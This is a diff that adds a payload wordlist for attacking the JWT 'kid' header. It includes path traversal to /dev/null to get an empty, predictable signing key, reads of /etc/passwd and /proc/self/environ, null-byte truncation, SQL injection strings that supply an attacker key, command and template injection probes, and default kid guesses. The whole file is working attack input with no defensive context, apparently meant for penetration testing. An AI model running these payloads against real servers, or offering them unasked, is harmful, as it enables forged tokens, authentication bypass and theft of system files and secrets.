@@ -1,0 +1,32 @@
+# Path traversal — server reads kid as a file path; /dev/null gives empty key (HMAC predictable).
+../../../../../../dev/null
+../../../../../../../../../../dev/null
+../../../../../../etc/passwd
+../../../../../../proc/self/environ
+file:///dev/null
+# Null byte truncation
+../../../../../../dev/null%00
+key.pem%00.jwt
+# SQL injection — kid used as a SELECT key
+' UNION SELECT 'attacker-key'--
+' OR 1=1--
+" UNION SELECT 'a'-- -
+# Command/eval injection (rare but seen in old Ruby)
+;system('id');//
+${'a'}
+{{7*7}}
+# Absolute path
+/dev/null
+/dev/random
+C:\Windows\win.ini
+# Common kid values worth trying as-is (some servers fall back to a default)
+1
+0
+-1
+default
+master
+admin
+test
+key
+key1
+key2
